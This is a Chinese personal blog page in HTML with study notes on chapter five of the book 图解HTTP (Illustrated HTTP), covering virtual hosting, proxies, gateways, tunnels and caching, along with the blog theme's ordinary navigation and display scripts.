<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8" />

<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="keywords" content="Gridea静态个人博客">
<meta name="description" content="&lt;strong&gt;前端小白&lt;/strong&gt;">
<meta name="theme-color" content="#000">
<title>图解HTTP第五章 | fanfan</title>
<link rel="shortcut icon" href="/favicon.ico?v=1645441448749">
<link rel="stylesheet" href="/media/css/pisces.css">
<link rel="stylesheet" href="/media/fonts/font-awesome.css">
<link
  href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Rosario:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext"
  rel="stylesheet" type="text/css">

<link href="/media/hljs/styles/default.css"
  rel="stylesheet">

<link rel="stylesheet" href="/styles/main.css">
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script src="/media/js/jquery.js"></script>
<script src="/media/hljs/highlight.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.ui.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css"
  integrity="sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq" crossorigin="anonymous">


<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"
  integrity="sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js"
  integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous"
  onload="renderMathInElement(document.body);"></script>






  <meta name="description" content="图解HTTP第五章" />
  <meta name="keywords" content="网络" />
</head>

<body>
  <div class="head-top-line"></div>
  <div class="header-box">
    
<div class="pisces">
  <header class="header  ">
    <div class="blog-header box-shadow-wrapper bg-color " id="header">
      <div class="nav-toggle" id="nav_toggle">
        <div class="toggle-box">
          <div class="line line-top"></div>
          <div class="line line-center"></div>
          <div class="line line-bottom"></div>
        </div>
      </div>
      <div class="site-meta">       
        <div class="site-title">
          
            <a href="/" class="brand">
              <span>fanfan</span>
            </a>  
          
        </div>
        
          <p class="subtitle">精于心，简于形</p>
        
      </div>
      <nav class="site-nav" id="site_nav">
        <ul id="nav_ul">
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/" target="_self">
                  <i class="fa fa-home"></i> 首页
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/tag/hjqM1TBv9//" target="_self">
                  <i class="fa fa-globe"></i> JS
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="tag/SPTV9Qrgr/" target="_self">
                  <i class="fa fa-globe"></i> CSS
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="tag/RyHRU5tQB//" target="_self">
                  <i class="fa fa-globe"></i> 算法
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/tag/KATkWfQKE//" target="_self">
                  <i class="fa fa-globe"></i> Http
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/tag/YjLqWgkox//" target="_self">
                  <i class="fa fa-globe"></i> Vue
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/tag/68KZf8W4c/" target="_self">
                  <i class="fa fa-globe"></i> 浏览器
                </a>
              
            </li>
          
          
            
              <li class="nav-item ">
                <a href="/friends/" target="_self">
                  
                    <i class="fa fa-address-book"></i> 友情链接
                  
                </a>
              </li>
            
          
          
            <li id="fa_search" class="nav-item">
              <a href="javascript:void(0);">
                <i class="fa fa-search"></i> <span class="language" data-lan="search">搜索</span>
              </a>
            </li>
          
        </ul>
      </nav>
    </div>
  </header>
</div>

<script type="text/javascript"> 
 
  let showNav = true;

  let navToggle = document.querySelector('#nav_toggle'),
  siteNav = document.querySelector('#site_nav');
  
  function navClick() {
    let sideBar = document.querySelector('.sidebar');
    let navUl = document.querySelector('#nav_ul');
    navToggle.classList.toggle('nav-toggle-active');
    siteNav.classList.toggle('nav-menu-active');
    if (siteNav.classList.contains('nav-menu-active')) {
      siteNav.style = "height: " + (navUl.children.length * 42) +"px !important";
    } else {
      siteNav.style = "";
    }
  }

  navToggle.addEventListener('click',navClick);  
</script>
  </div>
  <div class="main-continer">
    
    <div
      class="section-layout pisces ">
      <div class="section-layout-wrapper">
        

<div class="sidebar">
  
    <div class="sidebar-box box-shadow-wrapper bg-color right-motion" id="sidebar">
      
        <div class="post-list-sidebar">
          <div class="sidebar-title">
            <span id="tocSideBar" class="sidebar-title-item sidebar-title-active language" data-lan="index">文章目录</span>
            <span id="metaSideBar" class="sidebar-title-item language" data-lan="preview">站点概览</span>
          </div>
        </div>
      
      <div class="sidebar-body pisces" id="sidebar_body">
        
          
            <div class="post-side-meta" id="post_side_meta">
              
<div class="sidebar-wrapper box-shadow-wrapper bg-color">
  <div class="sidebar-item">
    <img class="site-author-image right-motion" src="/images/avatar.png"/>
    <p class="site-author-name">fanfan</p>
    
  </div>
  <div class="sidebar-item side-item-stat right-motion">
    <div class="sidebar-item-box">
      <a href="/archives/">
        
        <span class="site-item-stat-count">90</span>
        <span class="site-item-stat-name language" data-lan="article">文章</span>
      </a>
    </div>
    <div class="sidebar-item-box">
      <a href="">
        <span class="site-item-stat-count">9</span>
        <span class="site-item-stat-name language" data-lan="category">分类</span>
      </a>
    </div>
    <div class="sidebar-item-box">
      <a href="/tags/">
        <span class="site-item-stat-count">9</span>
        <span class="site-item-stat-name language" data-lan="tag">标签</span>
      </a>
    </div>
  </div>
  
    
  
  
    <div class="sidebar-item sidebar-item-social">
      <div class="social-item">
        
          
            <a href="https://github.com/fanfankill">
              <i class="fa fa-github-alt" title="github"></i>
            </a>
          
        
        
          
            <a class="social-img" href="#">
              <img src="\media\images\custom-array-imgSocials-1626669538893-socialImg.png" />
              <i class="fa fa-qq" title="QQ" ></i>
            </a>
          
        
      </div>
    </div>
  



</div>
            </div>
            <div class="post-toc sidebar-body-active" id="post_toc" style="opacity: 1;">
              <div class="toc-box right-motion">
  <div class="toc-wrapper auto-number auto"
    id="toc_wrapper">
    <ul class="markdownIt-TOC">
<li><a href="#%E4%B8%8Ehttp%E5%8D%8F%E5%8A%A9%E7%9A%84web%E6%9C%8D%E5%8A%A1%E5%99%A8">与HTTP协助的Web服务器</a>
<ul>
<li><a href="#%E7%94%A8%E5%8D%95%E5%8F%B0%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E5%AE%9E%E7%8E%B0%E5%A4%9A%E4%B8%AA%E5%9F%9F%E5%90%8D">用单台虚拟主机实现多个域名</a></li>
<li><a href="#%E9%80%9A%E4%BF%A1%E6%95%B0%E6%8D%AE%E8%BD%AC%E5%8F%91%E7%A8%8B%E5%BA%8F%E4%BB%A3%E7%90%86-%E7%BD%91%E5%85%B3-%E9%9A%A7%E9%81%93">通信数据转发程序：代理、网关、隧道</a>
<ul>
<li><a href="#%E4%BB%A3%E7%90%86"><strong>代理</strong></a>
<ul>
<li><a href="#%E7%BC%93%E5%AD%98%E4%BB%A3%E7%90%86">缓存代理</a></li>
<li><a href="#%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86">透明代理</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E7%BD%91%E5%85%B3">网关</a></li>
<li><a href="#%E9%9A%A7%E9%81%93">隧道</a></li>
<li><a href="#%E4%BF%9D%E5%AD%98%E8%B5%84%E6%BA%90%E7%9A%84%E7%BC%93%E5%AD%98">保存资源的缓存</a>
<ul>
<li><a href="#%E7%BC%93%E5%AD%98%E6%9C%89%E6%95%88%E6%9C%9F">缓存有效期</a></li>
<li><a href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E7%BC%93%E5%AD%98">客户端的缓存</a></li>
</ul>
</li>
</ul>
</li>
</ul>

  </div>
</div>

<script>

  let lastTop = 0, lList = [], hList = [], postBody, lastIndex = -1;
  let active = 'active-show', activeClass = 'active-current';
  let tocWrapper = document.querySelector('#toc_wrapper');
  let tocContent = tocWrapper.children[0];
  let autoNumber = tocWrapper && tocWrapper.classList.contains('auto-number');

  function addTocNumber(elem, deep) {
    if (!elem) {
      return;
    }
    let prop = elem.__proto__;

    if (prop === HTMLUListElement.prototype) {
      for (let i = 0; i < elem.children.length; i++) {
        addTocNumber(elem.children[i], deep + (i + 1) + '.');
      }
    } else if (prop === HTMLLIElement.prototype) {
      // 保存li元素
      if (elem.children[0] && elem.children[0].__proto__ === HTMLAnchorElement.prototype) {
        lList.push(elem);
      }
      for (let i = 0; i < elem.children.length; i++) {
        let cur = elem.children[i];
        if (cur.__proto__ === HTMLAnchorElement.prototype) {
          if (autoNumber) {
            cur.text = deep + ' ' + cur.text;
          }
        } else if (cur.__proto__ === HTMLUListElement.prototype) {
          addTocNumber(cur, deep);
        }
      }
    }
  }

  function removeParentActiveClass() {
    let parents = tocContent.querySelectorAll('.' + active)
    parents.forEach(function (elem) {
      elem.classList.remove(active);
    });
  }

  function addActiveClass(index) {
    if (index >= 0 && index < hList.length) {
      lList[index].classList.add(activeClass);
    }
  }

  function removeActiveClass(index) {
    if (index >= 0 && index < hList.length) {
      lList[index].classList.remove(activeClass);
    }
  }

  function addActiveLiElemment(elem, parent) {
    if (!elem || elem === parent) {
      return;
    } else {
      if (elem.__proto__ === HTMLLIElement.prototype) {
        elem.classList.add(active);
      }
      addActiveLiElemment(elem.parentElement, parent);
    }
  }

  function showToc() {
    if (tocWrapper) {
      postBody = document.querySelector('#post_body');
      for (let i = 0; i < postBody.children.length; i++) {
        if (postBody.children[i].__proto__ === HTMLHeadingElement.prototype) {
          hList.push(postBody.children[i]);
        }
      }
      if (tocWrapper.classList.contains('compress')) {
        tocContent.classList.add('closed');
      } else if (tocWrapper.classList.contains('no_compress')) {
        tocContent.classList.add('expanded');
      } else {
        if (hList.length > 10) {
          active = 'active-hidden'
          tocContent.classList.add('closed');
        } else {
          tocContent.classList.add('expanded');
        }
      }
    }
  }

  (function () {
    // 处理不是从#一级标题开始目录
    if (tocContent.children.length === 1 && tocContent.children[0].__proto__ === HTMLLIElement.prototype) {
      let con = tocContent.children[0].children[0];
      tocContent.innerHTML = con.innerHTML;
    }
    let markdownItTOC = document.querySelector('.markdownIt-TOC');
    let innerHeight = window.innerHeight;
    markdownItTOC.style = `max-height: ${innerHeight - 80 > 0 ? innerHeight - 80 : innerHeight}px`
    addTocNumber(tocContent, '');
  })();

  document.addEventListener('scroll', function (e) {
    if (lList.length <= 0) {
      return;
    }
    let scrollTop = document.scrollingElement.scrollTop + 10;
    let dir;

    if (lastTop - scrollTop > 0) {
      dir = 'up';
    } else {
      dir = 'down';
    }

    lastTop = scrollTop;
    if (scrollTop <= 0) {
      if (lastIndex >= 0 && lastIndex < hList.length) {
        lList[lastIndex].classList.remove(activeClass);
      }
      return;
    }

    let current = 0, hasFind = false;
    for (let i = 0; i < hList.length; i++) {
      if (hList[i].offsetTop > scrollTop) {
        current = i;
        hasFind = true;
        break;
      }
    }
    if (!hasFind && scrollTop > lList[lList.length - 1].offsetTop) {
      current = hList.length - 1;
    } else {
      current--;
    }
    if (dir === 'down') {
      if (current > lastIndex) {
        addActiveClass(current);
        removeActiveClass(lastIndex)
        lastIndex = current;
        removeParentActiveClass();
        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
      }
    } else {
      if (current < lastIndex) {
        addActiveClass(current);
        removeActiveClass(lastIndex);
        lastIndex = current;
        removeParentActiveClass();
        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
      }
    }
  });


  window.addEventListener('load', function () {
    showToc();
    document.querySelector('#sidebar').style = 'display: block;';
    tocWrapper.classList.add('toc-active');
    setTimeout(function () {
      if ("createEvent" in document) {
        let evt = document.createEvent("HTMLEvents");
        evt.initEvent("scroll", false, true);
        document.dispatchEvent(evt);
      }
      else {
        document.fireEvent("scroll");
      }
    }, 500)
  })

</script>
            </div>
          
        
      </div>
    </div>
  
</div>
<script>
  const SIDEBAR_TITLE_ACTIVE = 'sidebar-title-active';
  const SIDEBAR_BODY_ACTIVE = 'sidebar-body-active';
  const SLIDE_UP_IN = 'slide-up-in';

  let sidebar = document.querySelector('#sidebar'),
  tocSideBar = document.querySelector('#tocSideBar'),
  metaSideBar = document.querySelector('#metaSideBar'),
  postToc = document.querySelector('#post_toc'),
  postSiteMeta = document.querySelector('#post_side_meta'),
  sidebarTitle = document.querySelector('.sidebar-title'),
  sidebarBody = document.querySelector('#sidebar_body');

  tocSideBar && tocSideBar.addEventListener('click', (e) => {
    toggleSidebar(e);
  });

  metaSideBar && metaSideBar.addEventListener('click', (e) => {
    toggleSidebar(e);
  });

  function toggleSidebar(e) {
    let currentTitle = document.querySelector("."+SIDEBAR_TITLE_ACTIVE);
    if (currentTitle == e.srcElement) {
      return ;
    }
    let current, showElement, hideElement;
    if (e.srcElement == metaSideBar) {
      showElement = postSiteMeta;
      hideElement = postToc;
    } else if (e.srcElement == tocSideBar){
      showElement = postToc;
      hideElement = postSiteMeta;
    }
    currentTitle.classList.remove(SIDEBAR_TITLE_ACTIVE);
    e.srcElement.classList.add(SIDEBAR_TITLE_ACTIVE);

    jQuery.Velocity(hideElement, 'stop');
    jQuery.Velocity(hideElement, 'transition.slideUpOut', {
      display: 'none',
      duration: 200,
      complete: function () {
        jQuery.Velocity(showElement, 'transition.slideDownIn', {
          duration: 200
        });
      }
    })
    hideElement.classList.remove(SIDEBAR_BODY_ACTIVE);
    showElement.classList.add(SIDEBAR_BODY_ACTIVE);
  }

  postToc && postToc.addEventListener('transitionend', function() {
    this.classList.remove(SLIDE_UP_IN);
  });

  if (sidebarBody) {
    if (sidebarBody.classList.contains('pisces') || sidebarBody.classList.contains('gemini')) {
      let hasFix = false;
      let scrollEl = document.querySelector('.main-continer');
      let limitTop = document.querySelector('#nav_ul').children.length * 42 + 162;
      window.addEventListener('scroll', function(e) {
        if (document.scrollingElement.scrollTop >= limitTop) {
          if (!hasFix) {
            sidebar.classList.add('sidebar-fixed');
            hasFix = true;
          }
        } else {
          if (hasFix) {
            sidebar.classList.remove('sidebar-fixed');
            hasFix = false;
          }
        }
      });
    }
  }
  
</script>
        <div class="section-box box-shadow-wrapper">
          <div class="section bg-color post post-page">
            <section class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://fanfankill.github.io/post/tu-jie-http-di-liu-zhang/">
      图解HTTP第五章
    </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span class="language" data-lan="publish">发布于</span>
      <span class="publish-time" data-t="2021-04-27 08:11:29">2021-04-27</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-folder-o"></i>
      <span class="pc-show language" data-lan="category-in">分类于</span>
      
      
      <a href="https://fanfankill.github.io/tag/KATkWfQKE/">
        <span>网络</span>
      </a>
      
      
    </span>
    <span class="post-meta-divider">|</span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span>3<span class="language" data-lan="minute">分钟</span></span>
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span>730<span class="pc-show language" data-lan="words">字数</span></span>
    </span>
    
  </div>
</section>
            <div class="post-body next-md-body" id="post_body">
              <h1 id="与http协助的web服务器">与HTTP协助的Web服务器</h1>
<h2 id="用单台虚拟主机实现多个域名">用单台虚拟主机实现多个域名</h2>
<p>允许一台HTTP服务器搭建多个Web站点。</p>
<p>即使物理层面只有一台服务器，但只要使用虚拟主机的功能，则可以假想已具有多台服务器</p>
<p>在互联网上，域名通过 DNS 服务映射到 IP 地址（域名解析）之后访问目标网站，所以，当请求发送到服务器时，已经是IP地址形式访问了</p>
<h2 id="通信数据转发程序代理-网关-隧道">通信数据转发程序：代理、网关、隧道</h2>
<ul>
<li>
<p>代理</p>
<p>扮演中间人，接收由客户端发送的请求并转发给服务器，同是，也接收服务器返回的响应并转发给客户端</p>
</li>
<li>
<p>网关</p>
<p>网关是转发其他服务器通信数据的服务器，接收从客户端发送来的请求时，它就像自己拥有资源的服务器</p>
</li>
<li>
<p>隧道</p>
<p>隧道是在相隔甚远的客户端和服务器两者之间进行中转，并保持双方通信连接的应用程序</p>
</li>
</ul>
<h3 id="代理"><strong>代理</strong></h3>
<p>利用代理服务器的理由：利用缓存技术减少网络带宽的流量，组织内部针对特定网站的访问控制，以获取访问日志为主要目的</p>
<p>代理按两种基准分类：一种是是否使用缓存，另一种是是否会修改报文</p>
<h4 id="缓存代理">缓存代理</h4>
<p>代理转发响应时，缓存代理会预先将资源的副本（缓存）保存在代理服务器上</p>
<p>当代理再次接收对相同资源的请求时，就可以不从源服务器那里获取资源，而是将之前缓存的资源作为响应返回</p>
<h4 id="透明代理">透明代理</h4>
<p>转发请求或响应时，不对报文做任何加工的代理类型被称为<strong>透明代理</strong>，反之，称为非透明代理</p>
<hr>
<h2 id="网关">网关</h2>
<p>可以利用网关将HTTP请求转化为其他协议通信</p>
<p>利用网关能提高通信的安全性，因为可以在客户端与网关之间的通信线路上加密以确保连接的安全。<br>
<img src="https://fanfankill.github.io/post-images/1619484447634.png" alt="" loading="lazy"></p>
<h2 id="隧道">隧道</h2>
<p>隧道可以按要求建立起一条与其他服务器的通信线路，可以使用SSL等加密手段进行通信。隧道的目的就是保住客户端与服务器能安全进行通信<br>
<img src="https://fanfankill.github.io/post-images/1619484421757.png" alt="" loading="lazy"></p>
<p>隧道本身不会去解析HTTP请求。请求保持原样中转给服务器。隧道会在双方通信断开连接的时候结束</p>
<hr>
<h2 id="保存资源的缓存">保存资源的缓存</h2>
<p>代理服务器会在服务器返回的响应时，保存一份资源副本<br>
<img src="https://fanfankill.github.io/post-images/1619484470802.png" alt="" loading="lazy"></p>
<h3 id="缓存有效期">缓存有效期</h3>
<p>存在资源更新等影响，需要去向源服务器确认</p>
<h3 id="客户端的缓存">客户端的缓存</h3>
<p>缓存也可以存在于客户端浏览器中，这种叫做<strong>临时网络文件</strong></p>

            </div>
            
            
              <div class="post-footer">
  <ul class="post-copyright">
    <li class="post-copyright-author">
      <strong class="language" data-lan="author">本文作者：</strong>
      fanfan
    </li>
    <li class="post-copyright-link">
      <strong class="language" data-lan="link">本文链接：</strong>
      <a href="https://fanfankill.github.io/post/tu-jie-http-di-liu-zhang/" title="图解HTTP第五章">https://fanfankill.github.io/post/tu-jie-http-di-liu-zhang/</a>
    </li>
    <li class="post-copyright-license">
      <strong class="language" data-lan="copyright">版权声明： </strong>
      本博客所有文章除特别声明外，均采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i> BY-NC-SA</a> 许可协议。转载请注明出处！
    </li>
  </ul>
  <div class="tags">
    
      <a href="https://fanfankill.github.io/tag/KATkWfQKE/"># 网络</a>
    
  </div>
  <div class="nav">
    <div class="nav-prev">
      
        <i class="fa fa-chevron-left"></i>
        <a class="nav-pc-next" title="JS事件" href="https://fanfankill.github.io/post/js-shi-jian/">JS事件</a class="nav-pc-next">
        <a class="nav-mobile-prev" title="JS事件" href="https://fanfankill.github.io/post/js-shi-jian/">上一篇</a>
      
    </div>
    <div class="nav-next">
      
        <a class="nav-pc-next" title="图解HTTP第四章" href="https://fanfankill.github.io/post/tu-jie-http-di-si-zhang/">图解HTTP第四章</a>
        <a class="nav-mobile-next" title="图解HTTP第四章" href="https://fanfankill.github.io/post/tu-jie-http-di-si-zhang/">下一篇</a>
        <i class="fa fa-chevron-right"></i>
      
    </div>
  </div>
</div>
            
            
  

          </div>
        </div>
      </div>
    </div>
    <div class="footer-box">
  <footer class="footer">
    <span id="busuanzi_container_site_pv">浏览数 <span id="busuanzi_value_site_pv"></span> 次</span>
    <span class="post-meta-divider">|</span>
    <span id="busuanzi_container_site_uv">访客数 <span id="busuanzi_value_site_uv"></span> 人</span>
    <div class="copyright">
      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> ©2019 | Theme By <a
        href="https://github.com/hsxyhao/gridea-theme-next" target="_blank">HsxyHao</a>
    </div>
    <div class="poweredby">
      Hardworking
    </div>
  </footer>
  
  
  <div class="pisces back-to-top" id="back_to_top">
    <i class="fa fa-arrow-up"></i>
    
    <span class="scrollpercent">
      <span id="back_to_top_text">0</span>%
    </span>
    
  </div>
  
  
  
  <div class="bg-img">
    <img src="\media\images\custom-bgImg.jpg" />
  </div>
  
  
  
  
</div>
<script>

  let sideBarOpen = 'sidebar-open';
  let body = document.body;
  let back2Top = document.querySelector('#back_to_top'),
    back2TopText = document.querySelector('#back_to_top_text'),
    drawerBox = document.querySelector('#drawer_box'),
    rightSideBar = document.querySelector('.sidebar'),
    viewport = document.querySelector('body');

  function scrollAnimation(currentY, targetY) {

    let needScrollTop = targetY - currentY
    let _currentY = currentY
    setTimeout(() => {
      const dist = Math.ceil(needScrollTop / 10)
      _currentY += dist
      window.scrollTo(_currentY, currentY)
      if (needScrollTop > 10 || needScrollTop < -10) {
        scrollAnimation(_currentY, targetY)
      } else {
        window.scrollTo(_currentY, targetY)
      }
    }, 1)
  }

  back2Top.addEventListener("click", function (e) {
    scrollAnimation(document.scrollingElement.scrollTop, 0);
    e.stopPropagation();
    return false;
  });

  window.addEventListener('scroll', function (e) {
    let percent = document.scrollingElement.scrollTop / (document.scrollingElement.scrollHeight - document.scrollingElement.clientHeight) * 100;
    if (percent > 1 && !back2Top.classList.contains('back-top-active')) {
      back2Top.classList.add('back-top-active');
    }
    if (percent == 0) {
      back2Top.classList.remove('back-top-active');
    }
    if (back2TopText) {
      back2TopText.textContent = Math.floor(percent);
    }
  });


  let hasCacu = false;
  window.addEventListener('resize', function (e) {
    calcuHeight();
  });

  function calcuHeight() {
    // 动态调整站点概览高度
    if (!hasCacu && back2Top.classList.contains('pisces') || back2Top.classList.contains('gemini')) {
      let sideBar = document.querySelector('.sidebar');
      let navUl = document.querySelector('#site_nav');
      sideBar.style = 'margin-top:' + (navUl.offsetHeight + navUl.offsetTop + 15) + 'px;';
      hasCacu = true;
    }
  }
  calcuHeight();

  let open = false, MOTION_TIME = 300, RIGHT_MOVE_DIS = '320px';

  if (drawerBox) {
    let rightMotions = document.querySelectorAll('.right-motion');
    let right = drawerBox.classList.contains('right');

    let transitionDir = right ? "transition.slideRightIn" : "transition.slideLeftIn";

    let openProp, closeProp;
    if (right) {
      openProp = {
        paddingRight: RIGHT_MOVE_DIS
      };
      closeProp = {
        paddingRight: '0px'
      };
    } else {
      openProp = {
        paddingLeft: RIGHT_MOVE_DIS
      };
      closeProp = {
        paddingLeft: '0px'
      };
    }

    drawerBox.onclick = function () {
      open = !open;
      jQuery.Velocity(rightSideBar, 'stop');
      jQuery.Velocity(viewport, 'stop');
      jQuery.Velocity(rightMotions, 'stop');
      if (open) {
        jQuery.Velocity(rightSideBar, {
          width: RIGHT_MOVE_DIS
        }, {
          duration: MOTION_TIME,
          begin: function () {
            jQuery.Velocity(rightMotions, transitionDir, {});
          }
        })
        jQuery.Velocity(viewport, openProp, {
          duration: MOTION_TIME
        });
      } else {
        jQuery.Velocity(rightSideBar, {
          width: '0px'
        }, {
          duration: MOTION_TIME,
          begin: function () {
            jQuery.Velocity(rightMotions, {
              opacity: 0
            });
          }
        })
        jQuery.Velocity(viewport, closeProp, {
          duration: MOTION_TIME
        });
      }
      for (let i = 0; i < drawerBox.children.length; i++) {
        drawerBox.children[i].classList.toggle('muse-line');
      }
      drawerBox.classList.toggle(sideBarOpen);
    }
  }

  // 链接跳转
  let newWindow = 'false'
  if (newWindow === 'true') {
    let links = document.querySelectorAll('.post-body a')
    links.forEach(item => {
      if (!item.classList.contains('btn')) {
        item.setAttribute("target", "_blank");
      }
    })
  }

  let faSearch = document.querySelector('#fa_search');
  faSearch && faSearch.addEventListener('click', function () {
    document.querySelector('#search_mask').style = ''
  })

  // 代码高亮
  hljs.initHighlightingOnLoad();
  
  // 离开当前页title变化
  var leaveTitle = "";
  var normal_title = document.title;
  if (leaveTitle) {
    document.addEventListener('visibilitychange', function () {
      if (document.visibilityState == 'hidden') {
        normal_title = document.title;
        document.title = leaveTitle;
      } else {
        document.title = normal_title;
      }
    });
  }

</script>

<link rel="stylesheet" href="/media/css/jquery.fancybox.css" />
<script src="/media/js/jquery.fancybox.js"></script>

<script>
  let images = document.querySelectorAll('.section img');
  images.forEach(image => {
    var parent = image.parentElement;
    var next = image.nextElementSibling;
    parent.removeChild(image);
    var aelem = document.createElement('a');
    aelem.href = image.src;
    aelem.dataset['fancybox'] = 'images';
    aelem.dataset['rel'] = 'fancybox-button';
    aelem.classList.add('fancybox');
    aelem.appendChild(image);
    parent.insertBefore(aelem, next);
  })
</script>

    <div class="reward-mask" style="display: none;">
  <div class="reward-relative">
    <span class="close" aria-hidden="true">x</span>
    <div class="reward-body">
      <h2>感谢您的支持，我会继续努力的!</h2>
      <div class="reward-img-box">
        <div style="position: relative; width: 140px; height: 140px;">
          
          
          
        </div>
      </div>
      <p class="reward-word">扫码打赏，你说多少就多少</p>
      <p class="reward-tip">打开微信扫一扫，即可进行扫码打赏哦</p>
    </div>
    <div class="bottom">
      
      
    </div>
  </div>
</div>
<style>
  .reward-mask {
    position: fixed;
    z-index: 99999;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    background-color: #00000054;
  }

  .reward-relative {
    position: relative;
    width: 480px;
    text-align: center;
    margin: 0 auto;
    border-radius: 5px;
    background-color: #fff;
    top: 50%;
    margin-top: -205px;
  }

  .reward-relative .close {
    position: absolute;
    right: 10px;
    font-weight: normal;
    font-size: 16px;
    color: #929292;
  }

  .reward-body {
    padding: 40px 20px 20px;
  }

  .bottom {
    display: flex;
  }

  .reward-btn {
    text-align: center;
  }

  .reward-btn-text {
    display: inline-block;
    cursor: pointer;
    width: 60px;
    height: 60px;
    line-height: 60px;
    border-radius: 50%;
    background-color: #ff9734;
    color: #FFF;
    margin-top: 20px;
  }

  .pay-text {
    margin-top: 10px;
    padding: 10px;
    flex: 1;
    transition: all .2s linear;
  }

  .pay-text:hover {
    background-color: #a5a5a536;
  }

  .reward-body h2 {
    padding-top: 10px;
    text-align: center;
    color: #a3a3a3;
    font-size: 16px;
    font-weight: normal;
    margin: 0 0 20px;
  }

  .reward-body h2:after,
  .reward-body h2:before {
    font-family: Arial, Helvetica, sans-serif;
    background: 0 0;
    width: 0;
    height: 0;
    font-style: normal;
    color: #eee;
    font-size: 80px;
    position: absolute;
    top: 20px;
  }

  .reward-body h2:before {
    content: '\201c';
    left: 50px;
  }

  .reward-body h2:after {
    content: '\201d';
    right: 80px;
  }

  .reward-img-box {
    display: inline-block;
    padding: 10px;
    border: 6px solid #ea5f00;
    margin: 0 auto;
    border-radius: 3px;
    position: relative;
  }

  .reward-img {
    position: absolute;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
  }

  @media (max-width: 767px) {
    .reward-relative {
      height: 100%;
      top: 0px;
      margin-top: 0;
      width: auto;
    }

    .reward-relative .bottom {
      flex-direction: column;
    }

    .reward-relative .pay-text {
      width: 80%;
      margin: 5px auto;
      border: 1px solid silver;
      padding: 6px;
      border-radius: 4px;
    }

    .reward-body h2:after {
      right: 40px;
    }

    .reward-body h2:after,
    .reward-body h2:before {
      font-size: 60px;
    }

    .reward-body h2:before {
      left: 20px;
    }
  }
</style>
<script>
  !function () {
    var mask = document.querySelector('.reward-mask');
    let close = document.querySelector('.reward-relative .close');
    let rewardBtn = document.querySelector('.reward-btn');

    let zfb = document.querySelector('#zfb'),
      wx = document.querySelector('#wx'),
      zfbBtn = document.querySelector('#zfbBtn'),
      wxBtn = document.querySelector('#wxBtn');

    if (zfbBtn && wxBtn) {
      zfbBtn.addEventListener('click', () => {
        jQuery.Velocity(zfb, 'transition.slideLeftIn', {
          duration: 400
        });
        jQuery.Velocity(wx, 'transition.slideRightOut', {
          display: 'none',
          duration: 400
        });
      });

      wxBtn.addEventListener('click', () => {
        jQuery.Velocity(wx, 'transition.slideRightIn', {
          duration: 400
        });
        jQuery.Velocity(zfb, 'transition.slideLeftOut', {
          display: 'none',
          duration: 400
        });
      });
    }

    rewardBtn.addEventListener('click', (e) => {
      jQuery.Velocity(mask, 'transition.slideDownIn', {
        duration: 400
      })
    });

    close.addEventListener('click', (e) => {
      e.preventDefault();
      jQuery.Velocity(mask, 'transition.slideUpOut', {
        duration: 400
      })
    })
  }()
</script>

  </div>
</body>

<div class="search-mask" id="search_mask" style="display: none;">
  <div class="search-box">
    <div class="search-title">
      <i class="fa fa-search"></i>
      <div class="input-box">
        <input id="search" type="text" class="language" data-lan="search" placeholder="搜索">
      </div>
      <i id="close" class="fa fa-times-circle"></i>
    </div>
    <div class="stat-box">
      <span id="stat_count">0</span><span class="language" data-lan="stat">条相关条目，使用了</span><span id="stat_times">0</span><span class="language" data-lan="stat-time">毫秒</span>
      <hr>
    </div>
    <div class="result" id="result">
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/vue-shi-xian-notification-zu-jian/"" data-c="
          &lt;h2 id=&#34;实现效果&#34;&gt;实现效果&lt;/h2&gt;
